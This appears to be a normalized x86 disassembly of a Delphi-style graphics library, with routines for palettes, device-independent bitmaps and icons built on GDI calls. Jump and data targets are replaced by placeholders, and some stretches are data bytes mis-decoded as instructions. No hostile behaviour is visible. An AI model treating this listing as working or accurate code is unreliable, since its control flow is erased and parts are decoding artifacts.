mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41ed0a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41ed1c
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028f0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41eb14
mov eax esp
call sub_41ec84
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41edc0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41eb14
mov [ esp ] eax
sub_41ee14
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e7bc
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e79c
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41efc0
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e62c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41e63c
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eeed
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41e530
sub_41eeed
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e7bc
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41e62c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41efa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41e63c
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41efa7
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41efdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41f06c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e2c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41f363
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41f155
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41e530
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f15c
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f15c
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41efd0
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e2c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41f343
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41ee14
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e2c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41f320
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f327
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402714
retn
call sub_41e584
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41efd0
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41efdc
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41f38c
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41e50c
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d44
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e7bc
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41f470
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41f38c
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41f4dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41f38c
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f579
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f580
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41f5b0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402d44
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402d44
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41f5a4
xor edx edx
push ebp
push sub_41f79e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41f470
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41f470
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f777
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e2c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e2c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e2c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e2c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41f4dc
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41f4dc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f77e
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402714
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402714
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402714
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402714
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41f77e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7a5
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41f7ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41f7fc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41f854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41f7fc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f89d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40328c
mov edi eax
mov eax esi
call sub_40328c
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f9d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f9ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f58
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9c1
mov al 0x1
sub_41f9f0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416504
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fa38
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa3f
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_41fa44
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41fa78
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_416504
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41fac3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41faca
mov eax [ ebp - 0x4 ]
call sub_403344
retn
sub_41faf4
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
or [ esi + 0x41 ] al
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
add [ edx + eax * 2 + 0x41 ] al
add al al
inc edx
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
push 0x41fb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5 ] bh
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x73ffbee1 ] dh
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
sar ah 0x41
add ah ah
inc ebx
inc ecx
add [ eax ] cl
inc esi
inc ecx
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] bh
add [ eax ] al
mov esp 0x8004010
add [ eax ] al
add [ ebp - 0x497ffc0 ] cl
inc ecx
add [ eax ] al
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc70
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41fc69
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403314
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403668
sub_41fb8c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41fc69
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403314
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41fd0c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x10 ]
